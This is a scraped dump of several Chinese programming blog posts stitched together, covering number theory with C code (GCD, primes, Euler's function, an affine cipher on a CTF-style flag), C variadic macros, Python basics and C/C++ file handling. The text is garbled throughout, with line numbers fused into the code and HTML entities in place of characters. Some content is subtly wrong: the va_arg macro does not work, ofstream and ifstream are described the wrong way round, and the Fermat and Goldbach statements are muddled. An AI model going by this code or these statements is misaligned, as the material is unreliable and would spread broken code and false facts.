123456789101144*05+30*F9=(D,0)=0467*01+33*FE=(g,3)=017B*01+52*FF=(&#123;,R)=2947*E9+56*13=(G,V)=0175*FD+5A*04=(u,Z)=0931*03+46*FE=(1,F)=0731*21+65*F0=(1,e)=0147*23+6C*E9=(G,l)=0168*F0+62*11=(h,b)=026D*0A+63*F5=(m,c)=0175*D1+7D*2C=(u,&#125;)=01 递归版本,copy from https://blog.csdn.net/AAMahone/article/details/79320635 1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;int main()&#123; int a,b,s,t,gcd; int exgcd(int a,int b,int *x,int *y); while(scanf(&quot;%d%d&quot;,&amp;a,&amp;b)!=EOF) &#123; gcd=exgcd(a,b,&amp;s,&amp;t); printf(&quot;%d %d &quot;,s,t); &#125; return 0;&#125;int exgcd(int a,int b,int *x,int *y)//扩展欧几里得算法;&#123; if(b==0) &#123; *x=1; *y=0; return a; &#125; int ret=exgcd(b,a%b,x,y); int t=*x; *x=*y; *y=t-a/b*(*y); return ret;&#125; 欧几里得算法3个不全为0的整数 y&#x3D;m*x+z 则(x,y)&#x3D;(x,z) 素数与素数相反的概念是合数 1既不是素数也不是合数 1234567if(p==素数)&#123;\tn∈正整数;\tif(!(p|n)) if(p&gt;=2&amp;&amp;p&lt;=sqrt(n)) n是素数;&#125; 关于能不能被整除,取%一下就OK 下面是素数的判断,有素数就返回非0,没有素数当然返回0 123456789101112131415161718192021222324252627282930int isprime(int n)&#123;\tint i=0;\tint j=0;\tint flag=0;//用于跳出循环的标志\tint cnt=0;//有多少个素数\tfor(j=n;j&gt;1;j--)\t&#123; flag=0; if(j==2) &#123; flag=1; &#125; for (i = 2; i &lt; j; i++) &#123; if (j % i == 0) &#123; flag=0;//不是素数 break; &#125; flag=1;//是素数 &#125; if(flag==1)//这里只不过是打印一下,但是cnt++是必要的 &#123; printf(&quot;%-5d&quot;,j); cnt++; &#125; &#125; return cnt;&#125; 公理 ps:假设求素数个数的公式是cntPrime() 12cntPrime(x) / (x/log(x)) 这个数学函数是一个递减的函数,值应该和1差不多,并且会无限趋于1,但是不会等于1吧 孪生素数猜想: 就是指相差2的素数对，例如3和5，5和7，11和13…。这个猜想正式由希尔伯特在1900年国际数学家大会的报告上第8个问题中提出， 可以这样描述： 存在无穷多个素数p，使得p + 2是素数。 素数对（p, p + 2）称为孪生素数。 在1849年，阿尔方·德·波利尼亚克提出了一般的猜想：对所有自然数k，存在无穷多个素数对（p, p + 2k）。k &#x3D; 1的情况就是孪生素数猜想 素数的判断,当然会有,如果p是素数,会有(p+偶数)也是素数,这个可以起到移动的混淆作用 哥德巴赫猜想 任一大于2的整数都可写成三个质数之和 任一大于5的整数都可写成三个质数之和 任一大于2的偶数都可写成两个质数之和 但是对应的质数不唯一,也就是可能与很多对 任何一个大于7的奇数都能被表示成三个奇质数的和 最小公倍数规定符号[x,y]就是求出x,y的最小公倍数 x,y是互素的正整数 &#96;&#96;&#96;if (x|z &amp;&amp; y|Z)则xy|z1234567891011121314 - [x,y]=xy2. a,b∈正整数 - [a,b]=ab/(a,b)3. a,b∈正整数 - ``` if( a|m &amp;&amp; b|m) &#123; [a,b]|m &#125; a1,a2,a3,a4,a5.an 是n个整数 ​\t让 ​\t[A1,A2]&#x3D;M2, ​\t[M2,A3]&#x3D;M3, ​\t[M3,A4]&#x3D;M4, ​\t… ​\t[Mn-1,An]&#x3D;Mn ​\t那么的话,[A1,A2,A3…An]&#x3D;Mn 算术基本原理 任何一个数,都可以分解为唯一的素数之乘积(包考虑顺序的话) 123456789101112131415161718192021222324252627282930313233343536373839#include&lt;stdio.h&gt; #define BYTE unsigned charvoid func(BYTE param);int main()&#123;\tchar flag[] = &quot;D0g3&#123;RGVuZ1F1eGlhbmcu&#125;&quot;;\tint len = 0;\tint i =0;\tlen = strlen(flag);\tfor (i = 0; i &lt; len; i++)\t&#123; printf(&quot;%c:%02X &quot;,flag[i],flag[i]); func(flag[i]); puts(&quot;&quot;);\t&#125;\t&#125;void func(BYTE param) &#123;\tint i = 2;//2是最小的素数\twhile (param &gt; i)\t&#123; if (param % i == 0) &#123; printf(&quot;%02X&quot;, i); param /= i; &#125; else &#123; i++; &#125;\t&#125;\tprintf(&quot;%02X&quot;, param);//最后无法分解了，则剩下的这个数就是最后一个质数因子\treturn;&#125; 输出 12345678910111213141516171819202122D:44 0202110:30 0202020203g:67 673:33 0311&#123;:7B 0329R:52 0229G:47 47V:56 022Bu:75 03030DZ:5A 020303051:31 0707F:46 0205071:31 0707e:65 65G:47 47l:6C 0202030303h:68 0202020Db:62 020707m:6D 6Dc:63 03030Bu:75 03030D&#125;:7D 050505 2同余基本性质(1) 对于正整数m,和2个整数a,b 如果 m&gt;b, m|a-b,就有a%m=b 这个结论可以理解为 存在k&gt;0,m&gt;b,km&#x3D;a-b,那么会有a%m&#x3D;b (2) 规定符号≡ a≡b(%m) 意思就是 m|a-b,a%m&#x3D;b 跳过上面那个结论,我们就可以延伸 m∈正整数 自反性:a≡a(%m) 对称性:如果a≡b(%m) 则 b≡a(%m) 传递性: 如果a≡b(%m),b≡c(%m) 则 a≡c(%m) (3) 设m为正整数,a,b,c,d为整数 如果a≡b(% m),c≡d(%m) 有 a+c ≡ b + d (%m) , ac ≡ bd (%m) (4) m为正整数, a,b,k 为整数,如果a≡b(%m) 有 a + k ≡ b + k (%m) , ak ≡ bk(%m) (5) 如果 a≡b(%m) ,则有 na≡nb(%m),n为正整数 如果 a≡b(%m) ,则有 a^n^≡b^n^(%m), 一些运算规则 (a+b)%m &#x3D; (a%m + b%m)%m (ab)%m &#x3D;( a%m x b%m ) %m (na)%m &#x3D; n(a%m)%m N&#x3D;N1+N2 那么,(NA)%m &#x3D; (N1xA%m+N2xA%m)%m ​\ta^N^%m&#x3D;(a%m)^n^%m ​ &#x3D;((a%m)^N1^x(a%m)^N2^)%m (6) 如果m为正整数,a,b为整数,ad≡bd(%m), (d,m)&#x3D;1 那么a≡b(%m) (7) 设m为正整数,a,b为整数,若a≡b(%m),且k&gt;0 则ak≡bk(%mk) (8) 设m为正整数 a,b为整数 a≡b(%m) d|(a,b,m) d&gt;0 则(a&#x2F;d)≡(b&#x2F;d)%(m&#x2F;d) (8) 设m为正整数 a,b为整数 a≡b(%m) d|m 则a≡b(%d) (9) 设m为正整数 a,b为整数 a≡b(%m) 则(a,m)&#x3D;(b,m) 欧拉函数什么叫互质,或者互为素数? 也就是2数,除了1以外,就没有公因数了 设n以内有m个和n互质的数,用符号φ(n)&#x3D;m表示那个结果 n和m之间不是一个一一对应的关系 123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;int mgcd(char);int main()&#123;\tchar flag[] = &quot;D0g3&#123;RGVuZ1F1eGlhbmcu&#125;&quot;;\tint i = 0;\tfor (i = 0; flag[i]; i++)\t&#123; printf(&quot;%c:%d &quot;, flag[i], mgcd(flag[i]));\t&#125; &#125;//返回值为1则互质int mgcd(char n)&#123; int i = 0; char res = n, t = n; for (i = 2; i * i &lt;= t; i++) &#123; if (n % i == 0) &#123; while (n % i == 0) n /= i; res = res / i * (i - 1); &#125; &#125; if (n &gt; 1) res = res / n * (n - 1); return res;&#125; 如果p为素数,有φ(p)&#x3D;p-1; 如果p为素数,α&gt;&#x3D;1,则φ(p^α^)&#x3D;p^α^-p^α-1^ 如果正整数m,n 且(m,n)&#x3D;1,则φ(mn)&#x3D;φ(m)*φ(n) 如果整数n&#x3D;pq,其中p,q是不同的素数,则φ(n)&#x3D;(p-1)*(q-1) 欧拉定理m是大于1的整数,如果(a,m)&#x3D;1,则有a^φ(m)^≡1(%m) 费马定理设p为素数,a为任意正整数,且a不是p的整数倍,有a^m-1^≡1(%m) 设a为素数,a为任意正整数,则a^p^^m-1^≡a(%p) 设m&gt;1是正整数,则m为素数的必要条件是:对某个a,不是m的整数倍,有a^m-1^≡1(%m) 模幂运算之前不是有个定理判断素数吗a≡b(%m) 现在我们的函数运算的是a^n^≡b(%m) 要求的结果是b为多少 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt; int powerModRec(int b, int n, int m)&#123;\tif (0 == n) return 1;\treturn b * powerModRec(b, n - 1, m) % m;&#125;int powerMod(int b, int n, int m)&#123;\t// a存放计算结果，初始化为1.\tint a = 1;\tint i, k = 0, num = n;\t/*计算指数的二进制位数k.\t*/\twhile (num)\t&#123; num = num &gt;&gt; 1; ++k;\t&#125;\t// 也可以将指数的二进制用一个数组或队列存放，方便取值.\tfor (i = 0; i &lt; k; ++i)\t&#123; // 取n的二进制的第i位，判断是否为1. if ((n &gt;&gt; i) &amp; 1) a = a * b % m; b = b * b % m;\t&#125;\treturn a;&#125;int main()&#123; int a, n, m;\tint b = 0;\tint i = 0;\tint len = 0;\tchar flag[] = &quot;D0g3&#123;RGVuZ1F1eGlhbmcu&#125;&quot;; len = strlen(flag);\tfor (i = 0; i &lt; len / 3; i++)\t&#123; b = powerMod(flag[i*3], flag[i * 3 +1], flag[i * 3 +2]); printf(&quot;%c^%c (mod %c) = %d &quot;, flag[i * 3], flag[i * 3 + 1], flag[i * 3 + 2], b);\t&#125;\treturn 0;&#125; 一次同余方程解一次同余方程 eg 密码学中的应用仿射密码算法,一个对称加密的算法,woc 对应 数组table[]&#x3D;{0,1,2,…,61,62,63},长度是64 选取一个公式 c≡k×p+b(%64) 这是一个加密的公式 其中 k满足的关系,(k,64)&#x3D;1,也就是k和64互质 b满足的关系,b&lt;64 那么解密公式的满足情况呢? 当然会是 p≡(c-b)&#x2F;p(%64) 但是这个1&#x2F;p不利于运算,可能不利于,会涉及小数吧 然后我们需要寻找一个和1&#x2F;p等价的数字,叫为逆元m 逆元满足的干系,p*(1&#x2F;p)≡1(%64) 那么p*m≡1(%64) 所以解密公式转化为 p≡(c-b)*m(%64) 1234567891011121314151617181920212223242526272829303132#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;int main()&#123;\t//c=(37p+47)%64 //37是公钥,37是和64互质的数字\t//p=(c-47)*45%64 //45是私钥,45是和37互质的数字\tint i = 0;\tchar\ttable[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwzyz0123456789&#123;&#125;&quot;;\tchar\tflag[] = &#123; 3,52,32,55,62,17,6,21,46,25,53,5,53,30,6,37,33,27,38,28,46,63, &#125;;\t//char flag[] = &quot;D0g3&#123;RGVuZ1F1eGlhbmcu&#125;&quot;;//字符串版本\tchar\tencode[128] = &#123; 0 &#125;;\tchar\tdecode[128] = &#123; 0 &#125;;\tint len = sizeof(flag)/sizeof(flag[0]);\tint tmp = 0;\tencode[64] = 0;\tdecode[64] = 0;\t//加密的过程\tfor (i = 0; i &lt; len; i++)\t&#123; encode[i] = (flag[i] * 37 + 47) % 64;\t&#125;\t//解密的过程\tfor (i = 0; i &lt; len; i++)\t&#123; tmp = (unsigned int)((encode[i] - 47) * 45) % 64;//这个符号的处理很重要的 decode[i] = table[tmp];\t&#125;\tputs(decode);&#125;//char flag[] = &quot;D0g3&#123;RGVuZ1F1eGlhbmcu&#125;&quot;;//字符串版本 自己的想法如果满足a|b,b|a,则b&#x3D;a或者b&#x3D;-a 1234567891011121314151617181920212223242526272829#include&lt;stdio.h&gt;#include&lt;string.h&gt;void DataCheck(char* param);int main()&#123;\tchar input[]=&quot;D0g3&#123;123&#125;&quot;;\tDataCheck(input);\treturn 0;&#125;void DataCheck(char * param)&#123;\tchar org[]=&quot;D0g3&#123;123&#125;&quot;;\tunsigned char *lp1=(unsigned char*)org;\tunsigned char *lp2=(unsigned char*)param;\tint i=0;\tint len=strlen(org);\tfor (i=0;i&lt;len;i++)\t&#123; if(lp1[i]%lp2[i]&amp;&amp;lp2[i]%lp1[i]) &#123; printf(&quot;You Lose &quot;); &#125; else continue;\t&#125;\tputs(&quot;Success&quot;);\treturn;&#125;","categories":["信安专业"]},{"title":"C语言","path":"/re4mile/2021/06/07/language/C/基础/language/","content":"可变参数成员参数栈函数传递进来的参数在栈里面的分布情况 va_list1typedef char * va_list; INTSIZEOF_INTSIZEOF(n): 把 n 圆整到 sizeof(int) 的倍数 1#define _INTSIZEOF(n) ( (sizeof(n)+sizeof(int)-1) &amp; ~(sizeof(int)-1) ) _INTSIZEOF(n)整个做的事情就是将字节长度n化为int长度的整数倍 ~(sizeof(int)-1) &#x3D; 1111 1100 一个数&amp; 1111 1100 ,结果一定为4的倍数 然后(sizeof(n)+ 3)&amp;1111 1100 例如，若1≤sizeof(n)≤4，则_INTSIZEOF(n)＝4；若5≤sizeof(n)≤8，则_INTSIZEOF(n)=8 至于如何化到整数倍,我觉得不是我们应该关心的,我我们应该关心,为什么要化到整数倍 答案: 方便字节对齐,然后方便指针的访问,指针直接4字节4字节的移动 疑惑: 可不可以不要那个方便…可以呀,如果只去掉那个方便,你的程序会g 因为所有的参数都是push进去的,每个参数都战4字节,哪怕传递一个char进去 所以你的指针只能4字节4字节的访问 va_startva_start(out_ap,in_v) 初始化 out_ap 指针， 使其指向最第一个可变参数。 也就是地址最低,最后push进去,最上面那个成员 1#define va_start(out_ap,in_v) (out_ap = (char*)&amp;in_v + _INTSIZEOF(in_v)) //于是就指向来了下一次参数 va_arg va_arg(in_ap, type) 该宏返回当前变参值,并使 in_ap 指向列表中的下个变参,地址向下移动 12345#define va_arg(in_ap, type) \\\t( *(type *)( (\tin_ap += _INTSIZEOF(type) - _INTSIZEOF(type)\t) ) va_endva_end(ap) ,将指针 ap 置为无效，结束变参的获取 1#define va_end(ap) ( ap = (va_list)0 ) 例子如何遍历参数? 设置cnt,记录有效参数个数 设置哨兵,-1 根据参数特定的标志来判断,eg: printf,scanf 情况1 1234567891011121314151617181920212223242526272829#include &lt;stdarg.h&gt;#include &lt;stdio.h&gt;void parse_valist_by_num(int arg_cnt, ...);int main(void)&#123; parse_valist_by_num(4,1,2,3,4);&#125;//第一个参数定义可变参数的个数void parse_valist_by_num(int arg_cnt, ...)&#123; va_list p_args; va_start(p_args, arg_cnt); int idx; int val; for(idx = 1; idx &lt;= arg_cnt; ++idx)&#123; val = va_arg(p_args, int); printf(&quot;第 %d 个参数: %d &quot;, idx, val); &#125; printf(&quot;--------------- &quot;); va_end(p_args);&#125; 情况2 12345678910111213141516171819202122232425262728#include &lt;stdarg.h&gt;#include &lt;stdio.h&gt;void parse_valist_by_flag(int num_1, ...);int main(void)&#123; parse_valist_by_flag(1,-1); parse_valist_by_flag(1,2,3,5,-1);&#125;//函数定义一个结束标记(-1)，调用时通过最后一个参数传递该标记，以结束变参的遍历打印。//最后一个参数作为变参结束符(-1)，用于循环获取变参内容void parse_valist_by_flag(int num_1, ...)&#123; va_list p_args; va_start(p_args, num_1); int idx = 0; int val = num_1; while(val != -1)&#123; ++idx; printf(&quot;第 %d 个参数: %d &quot;, idx, val); val = va_arg(p_args, int); //得到下个变参值 &#125; va_end(p_args); printf(&quot;--------------- &quot;);&#125; 情况3 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdarg.h&gt;#include&lt;stdio.h&gt;void minprintf(char* fmt, ...)&#123; va_list ap; char* p, * sval; int ival; double dval; va_start(ap, fmt); for (p = fmt; *p; p++) &#123; if (*p != &#x27;%&#x27;) &#123; putchar(*p); continue; &#125; switch (*++p) &#123; case &#x27;d&#x27;: ival = va_arg(ap, int); printf(&quot;%d&quot;, ival); break; case &#x27;f&#x27;: dval = va_arg(ap, double); printf(&quot;%f&quot;, dval); break; case &#x27;s&#x27;: for (sval = va_arg(ap, char*); *sval; sval++) putchar(*sval); break; default: putchar(*p); break; &#125; &#125; va_end(ap);&#125;int main()&#123; minprintf(&quot;%d %d&quot;, 123, 456);&#125; 随机数随机生成不重复的4选项 12345678910111213for(i=1;i&lt;Four_Option;i++)\t//之所以是1开头,是因为0已经排好了 &#123; do //生成不重复的随机数 &#123; Rand_Option_Flag=rand()%Num_Of_Words; //避免生成相同的随机数选项 for(j=0;j&lt;i;j++) if(Option_Arr[j]==Rand_Option_Flag) break;//这里只是跳出这个小的for的循环 &#125; while(i!=j);//这个判断说明了它发现了存在相同的随机数 Option_Arr[i]=Rand_Option_Flag;&#125;","tags":["C"],"categories":["Language"]},{"title":"有趣的C语言","path":"/re4mile/2021/06/07/language/C/有趣的C语言/language/","content":"音乐播放1234567891011121314151617181920 #include&lt;Windows.h&gt;#include&lt;mmsystem.h&gt;//包含多媒体设备接口头文件#pragma comment (lib,&quot;winmm.lib&quot;)//加载静态库int main()&#123;\t//alias 的作用是取别名\tmciSendString(&quot;open E:/0xC0de/C/2010/C1/C1/青花瓷.mp3 alias dqx &quot;,0,0,0);//音乐在当前目录下也可以写&quot;open ./2.mp3&quot;./这里可以省略\tmciSendString(&quot;play dqx&quot;, 0, 0, 0);\tsystem(&quot;pause&quot;);//这里没有暂停程序会直接停止听不到音乐\treturn 0;&#125;/*返回值：MCIERROR即DWORD类型，而DWORD类型就是unsigned int，执行成功返回0，出错返回非0值参数 :1，lpstrCommand，指向以null结尾的命令字符串：”命令 设备[参数]” open 打开音乐文件 play 播放音乐 repeat 重复播放 close 关闭音乐文件2，lpstrReturnString，指向接收返回信息的缓冲区，为NULL时不返回信息3，uReturnLength，上述缓冲区的大小4，hwndCallback，在命令串中含notify时，它指定一个回调窗口的句柄，一般为NULL*/","tags":["C"],"categories":["language"]},{"title":"Python","path":"/re4mile/2021/06/07/language/Python/基础/language/","content":"变量记录一次全局变量,注意它的反汇编语句 12345678a = 0 # initialize variable adef coo(): global a # call a a += 1 return a for i in range(10): print(coo()) 12345678a = []def coo(): global a a += [1] return a for i in range(10): print(coo()) 格式化输出参考链接 https://blog.csdn.net/python1639er/article/details/112325519 123name = &quot;Li hua&quot;age = 24print(&quot;Hello %s, you are %d years old&quot; % (name, age)) 文件处理重定向示例12345678910111213141516171819202122import sys console = sys.stdout # 备份一下文件描述符 file = open(r&quot;.\\file\\data.txt&quot;, &#x27;w&#x27;)sys.stdout = file # 把输出重定向到文件print(&#x27;hello &#x27;+&#x27;java &#x27;+&#x27;python&#x27;) # 输出自然会送往文件sys.stdout = console # 恢复重定向print(33) # 向控制台打印33 console = sys.stdin # 备份一下文件描述符 file = open(r&quot;F:/input.txt&quot;, &#x27;r&#x27;)sys.stdin = file # 把输入重定向到文件 mod = input() # 一下输入均来自文件src = input()des = input()size= input()file.close() # 关闭文件sys.stdin = console # 恢复重定向print(mod) # 打印到控制台print(int(src,16))print(int(des,16))print(int(size,10)) 读取文件的二进制数据1234567891011import numpy as npimport structimport sys # 加载测试数据fpath=&#x27;./data.bin&#x27;f = open(fpath,&#x27;rb&#x27;)nums=int(os.path.getsize(fpath)/4) # 4 是浮点数字节data = struct.unpack(&#x27;f&#x27;*nums,f.read(4*nums)) #注意一次只能读取一次，直接再读取会报错f.close()data = np.array(data).reshape(-1) 强制转化1234567891011121314151617181920· int(x) 将x转换为一个整数· float(x) 将x转换到一个浮点数· str(x) 将对象 x 转换为字符串· tuple(s) 将序列 s 转换为一个元组· list(s) 将序列 s 转换为一个列表· set(s) 将序列 s 转换为一个集合int(x [,base]) ⇒ 将x转换为一个十进制的整数long(x [,base]) ⇒ 将x转换为一个十进制的长整数float(x) ⇒ 将x转换为一个浮点数str(object) ⇒ 转换为字符串repr(object) ⇒ 转换为表达式字符串eval(str) ⇒ 用来计算在字符串中的有效Python表达式,并返回一个对象tuple(seq) ⇒ 将序列seq转换为一个元组list(seq) ⇒ 将序列seq转换为一个列表chr(x ) ⇒ 将一个整数转换为一个字符unichr(x ) ⇒ 将一个整数转换为Unicode字符ord(x ) ⇒ 将一个字符转换为它的整数值hex(x ) ⇒ 将一个整数转换为一个十六进制字符串oct(x ) ⇒ 将一个整数转换为一个八进制字符串 模块struct参考链接 https://www.cxybb.com/article/qq_43679818/86574114 struct 类型表 Format C Type Python type Standard size Notes x pad byte no value c char string of length 1 1 b signed char integer 1 (3) B unsigned char integer 1 (3) ? _Bool bool 1 (1) h short integer 2 (3) H unsigned short integer 2 (3) i int integer 4 (3) I unsigned int integer 4 (3) l long integer 4 (3) L unsigned long integer 4 (3) q long long integer 8 (2), (3) Q unsigned long long integer 8 (2), (3) f float float 4 (4) d double float 8 (4) s char[] string 1 p char[] string P void * integer (5), (3) struct.packstruct.unpackstruct.calcsizestruct.pack_intostruct.unpack_from","tags":["Python"],"categories":["Language"]},{"title":"C文件处理","path":"/re4mile/2021/06/07/language/文件处理/C/language/","content":"文件指针被typedef新创建的类型 12345typedef struct&#123;\tshort level;\t.......&#125;FILE; 获取文件大小123456789101112131415int ReadFileSize(char* filename)&#123;\tint size = 0;\tFILE* fp = fopen(filename, &quot;r&quot;);\tif (!fp)\t&#123; printf(&quot;wrong open &quot;); return -1;\t&#125;\tfseek(fp, 0L, SEEK_END);\tsize = ftell(fp);\tfclose(fp);\treturn size;&#125; 创建文件夹123456789101112131415161718192021#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;io.h&gt;#include &lt;direct.h&gt;int main()&#123;\tchar filename[128] = &quot;F:/linux/syscall&quot;;//50\tif (_access(filename, 0) == -1)\t&#123; _mkdir(filename);\t&#125;\telse\t&#123; printf(&quot;mkdir wrong %s &quot;, filename);\t&#125;\treturn 0;&#125; 其中, _access用于监测,该文件是否存在 _mkdir用于创建文件 值得注意的是,_mkdir一次调用只能创建一个文件夹,也就是不能递归创建,只能多次调用 下面是我创建文件夹,然后往文件夹里面创建文件的一个操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;io.h&gt;#include &lt;direct.h&gt;int main()&#123;\tint i = 0;\tint errorCode = 0;\tFILE* fp = 0;\tchar filename[128] = &quot;F:/5008/Note/re4mile/source/_posts/linux/syscall/中断详讲&quot;;//50\tchar tmp[64];\tif (_access(filename, 0) == -1)\t&#123; _mkdir(filename);\t&#125;\telse\t&#123; printf(&quot;mkdir wrong %s &quot;, filename);\t&#125;\tfor (i = 0; i &lt; 400; i += 16)\t&#123; memset(tmp, 0, 64); memset(filename + 57, 0, 64); sprintf(tmp, &quot;/%03d-%03d&quot;, i, i + 15);//要创建的文件夹 strcat(filename, tmp); if (_access(filename, 0) == -1) &#123; _mkdir(filename);//然后创建文件夹 //打开那个文件夹.在里面创建文件 strcat(filename, &quot;/linux.md&quot;); fp = fopen(filename, &quot;w&quot;); if (fp != 0) &#123; fclose(fp); printf(&quot;%s yes &quot;, filename); &#125; else &#123; printf(&quot;%s no &quot;, filename); &#125; &#125; else &#123; printf(&quot;mkdir wrong %s &quot;,filename); &#125; &#125;\treturn 0;&#125; 修改文件名字12345678910111213141516#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;windows.h&gt; int main()&#123;\t//way1\trename(&quot;tmp.js&quot;,&quot;tmp.exe&quot;); ShellExecute(NULL, &quot;open&quot;, &quot;tmp.exe&quot;, NULL, NULL, SW_SHOWNORMAL); return 0;&#125;/*\t//way2\tchar cmd[]=&quot;ren help.server tmp.exe&quot;;\tsystem(cmd);\tShellExecute(NULL, &quot;open&quot;, &quot;tmp.exe&quot;, NULL, NULL, SW_SHOWNORMAL); */ 其它ferrorC 库函数 int ferror(FILE *stream) 测试给定流 stream 的错误标识符。 1int ferror(FILE *stream) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了流 返回值 当读写文件错误的时候,ferror返回一个非零值 否则返回0 setbuf读取文本到缓冲区 1void setbuf(FILE *stream, char *buffer) 参数 FILE *stream, 一个流 char *buffer 一个缓冲区 功能 把指向流的数据显缓冲在缓冲区,然后通过fflush送到流 返回值 注意事项 buffer – 这是分配给用户的缓冲，它的长度至少为 BUFSIZ 字节，BUFSIZ 是一个宏常量，表示数组的长度 12char buf[BUFSIZ];setbuf(stdout, buf); 例子 1234567891011121314#include &lt;stdio.h&gt;int main()&#123;\tchar buff[BUFSIZ];\tint i=0;\tsetbuf(stdout, buff); puts(&quot;123&quot;);\tputs(&quot;456&quot;);\tfflush(stdout);\tputs(&quot;yes&quot;);\treturn(0);&#125; 输出的语句会被送达缓冲区 0x31,0x32,0x33,0xa,0x34,0x35,0x36,0xa, 然后fflush把缓冲区的数据送到流stdout setvbuf相比较setbuf,它多了模式mode可言 C 库函数 int setvbuf(FILE *stream, char *buffer, int mode, size_t size) 定义流 stream 应如何缓冲。 1int setvbuf(FILE *stream, char *buffer, int mode, size_t size) 参数 stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了一个打开的流。 buffer – 这是分配给用户的缓冲。如果设置为 NULL，该函数会自动分配一个指定大小的缓冲。 mode – 这指定了文件缓冲的模式： 关于mode 模式 描述 _IOFBF 全缓冲：对于输出，数据在缓冲填满时被一次性写入。对于输入，缓冲会在请求输入且缓冲为空时被填充。 _IOLBF 行缓冲：对于输出，数据在遇到换行符或者在缓冲填满时被写入，具体视情况而定。对于输入，缓冲会在请求输入且缓冲为空时被填充，直到遇到下一个换行符。 _IONBF 无缓冲：不使用缓冲。每个 I&#x2F;O 操作都被即时写入。buffer 和 size 参数被忽略。 size –这是缓冲的大小，以字节为单位。 功能 返回值 如果成功，则该函数返回 0，否则返回非零值。 和setbuf没太多的区别 remove永久删除文件 1int remove(const char *filename)//里面是一个字符串罢了 删除如果成功，则返回零。 如果错误，则返回 -1，并设置 errno。 另外垃圾桶找不到文件了,可以说真的删除找不到了 rename 重命名文件的名字 1int rename(const char *old_filename, const char *new_filename) const char *old_filename: 原来文件的名字 const char *new_filename: 新的文件名字 1234567891011121314151617181920#include &lt;stdio.h&gt;int main ()&#123; int ret; char oldname[] = &quot;d:/file.txt&quot;; char newname[] = &quot;d:/dqx.txt&quot;; ret = rename(oldname, newname); if(ret == 0) &#123; printf(&quot;文件重命名成功&quot;); &#125; else &#123; printf(&quot;错误：不能重命名该文件&quot;); &#125; return(0);&#125; 如果找到了”d:&#x2F;file.txt” 但是没有找到d:&#x2F;dqx.txt”; 那么源文件会被永久的删除 程序暂时还不会报错,正常的退出 ferror文件获取的错误类型 1int ferror(FILE *file_ptr) 返回文件发生错误的类型, 出错就返回非零的编号 没出错就返回0 1234if( ferror(fp) )&#123; printf(&quot;读取文件：file.txt 时发生错误 &quot;);&#125; clearerr文件错误的清理 1void clearerr(FILE *file_ptr) 清除文件发生的错误 tmpfile创建临时文件 以二进制更新模式(wb+)创建临时文件 流关闭的时候或者在程序终止的时候自动删除。 123456789101112131415161718192021#include &lt;stdio.h&gt;int main ()&#123; FILE *fp; fp = tmpfile(); printf(&quot;临时文件被创建 &quot;); /* 您可以在这里使用临时文件 ... ... ... */ fclose(fp); return(0);&#125; tmpnam返回临时文件名字的指针 1char *tmpnam(char *arr) 返回一个指向字符串arr的指针 arr是一个字符串数组 参数arr也可以为NULL 1234567891011121314151617181920#include &lt;stdio.h&gt;int main()&#123;\tchar* ptr;\tchar buffer[L_tmpnam];\t//L_tmpnam = 16 //库函数被调用1次 [0]\tptr=tmpnam(buffer);\tprintf(&quot;临时名称 : %s &quot;, buffer);\tprintf(&quot;临时名称 : %s &quot;, ptr);\t//库函数被调用2次 [1]\tprintf(&quot;临时名称 : %s &quot;, tmpnam(NULL)); return(0);&#125;","tags":["C","文件处理"],"categories":["Language"]},{"title":"C++文件处理","path":"/re4mile/2021/06/07/language/文件处理/Cpp/language/","content":"在 C++ 编程中，我们使用流插入运算符（ &lt;&lt; ）向文件写入信息，就像使用该运算符输出信息到屏幕上一样。唯一不同的是，在这里您使用的是 ofstream 或 fstream 对象，而不是 cout 对象。 在 C++ 编程中，我们使用流提取运算符（ &gt;&gt; ）从文件读取信息，就像使用该运算符从键盘输入信息一样。唯一不同的是，在这里您使用的是 ifstream 或 fstream 对象，而不是 cin 对象 文件流的数据类型 数据类型 描述 ofstream 该数据类型表示&#x3D;&#x3D;读取&#x3D;&#x3D;文件流，用于创建文件并向文件写入信息。 ifstream 该数据类型表示&#x3D;&#x3D;写入&#x3D;&#x3D;文件流，用于从文件读取信息。 fstream 该数据类型通常表示文件流，且同时&#x3D;&#x3D;具有 ofstream 和 ifstream 两种功能&#x3D;&#x3D;，这意味着它可以创建文件，向文件写入信息，从文件读取信息。 要在 C++ 中进行文件处理，必须在 C++ 源代码文件中包含头文件 和 。 open() 函数 open() 函数的标准语法，open() 函数是 fstream、ifstream 和 ofstream 对象的一个成员。 1void open(const char *filename, ios::openmode mode); 在这里，open() 成员函数的 第一参数指定要打开的文件的名称和位置 第二个参数定义文件被打开的模式。 模式标志 描述 ios::app 追加模式。所有写入都追加到文件末尾。append ios::ate 文件打开后定位到文件末尾。 ios::in 打开文件用于读取。read ios::out 打开文件用于写入。write ios::trunc 如果该文件已经存在，其内容将在打开文件之前被截断，即把文件长度设为 0。 还有很多的模式,比如二进制的写入 您可以把以上两种或两种以上的模式结合使用。 例如，如果您想要以写入模式打开文件，并希望截断文件，以防文件已存在，那么您可以使用下面的语法： &#x3D;&#x3D;这是一个二进制位的操作&#x3D;&#x3D; 12ofstream outfile;outfile.open(&quot;file.dat&quot;, ios::out | ios::trunc ); 类似地，您如果想要打开一个文件用于读写，可以使用下面的语法： 12ifstream afile;afile.open(&quot;file.dat&quot;, ios::out | ios::in ); close() 函数当 C++ 程序终止时， 它会自动关闭刷新所有流，释放所有分配的内存，并关闭所有打开的文件。 但程序员应该养成一个好习惯，在程序终止前关闭所有打开的文件。 下面是 close() 函数的标准语法，close() 函数是 fstream、ifstream 和 ofstream 对象的一个成员。 1void 